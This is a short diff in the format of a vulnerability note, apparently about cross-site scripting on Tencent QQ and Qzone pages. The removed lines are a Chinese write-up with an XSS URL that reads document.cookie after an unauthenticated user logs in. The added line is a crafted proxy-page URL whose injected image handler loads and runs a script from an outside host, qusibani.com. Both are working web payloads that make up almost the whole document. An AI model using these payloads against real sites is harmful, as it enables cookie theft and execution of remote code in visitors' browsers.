@@ -1,7 +1,1 @@
-1、未登录用户访问（也就是没有合法的uin cookie）
-http://qqapp.qq.com/app/100622432.html#jump=javascript://qzone.qq.com/%250aalert(document.cookie)%2F%2F%3Fqz_gdt%3d1
-重新输入账号名密码登陆后，alert就会执行
-（代码关键字段：V.widget.login.show）
-2、未登录用户访问页面以后，V.widget.login._cb函数的值已经变成了含有xss漏洞的函数，因此只需要配合另一个SOME漏洞（懒得写了）就可以不需要交互实现xss了
-  
-结论：未登录用户的无交互xss
+http://cn.qzonestyle.gtimg.cn/qzone/v6/custom/custom_module_proxy.html?#http://qzonestyle.gtimg.cn/=b&direction=1&funName=CustomModule.receiveContent<|||><img/src='//qusibani.com/omar.jpg'/onload="pornstar=document.body.appendChild(document.createElement('script'));pornstar.src='//qusibani.com/999.js'"><|||>&siDomain=/.gtimg.cn
